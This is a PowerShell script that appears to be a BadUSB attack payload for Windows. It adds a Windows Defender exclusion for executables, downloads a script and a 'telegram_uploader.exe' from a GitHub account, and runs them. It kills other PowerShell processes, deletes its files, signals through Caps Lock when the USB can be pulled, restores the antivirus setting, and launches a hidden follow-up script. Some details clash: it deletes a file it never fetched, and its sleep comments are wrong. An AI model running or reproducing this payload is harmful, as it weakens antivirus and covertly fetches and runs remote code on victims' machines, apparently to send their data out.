Set-Location C:\Users\Public\
Add-MpPreference -ExclusionExtension exe -Force 
Invoke-WebRequest https://raw.githubusercontent.com/PFranck06/HowardTelegram/main/fin_upload.ps1 -OutFile fin_upload.ps1 
Invoke-WebRequest https://raw.githubusercontent.com/PFranck06/HowardTelegram/main/telegram_uploader.exe -OutFile telegram_uploader.exe 
./telegram_uploader.exe -c "Hello World !" 
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process 
#Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
Remove-Item ciaoV2_upload.ps1
Remove-Item telegram_uploader.exe
#Enable and disable capslock to know when you can eject BadUSB
$keyBoardObject = New-Object -ComObject WScript.Shell
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionExtension exe -Force 
#Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 
#Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit 
#End .ps1 file
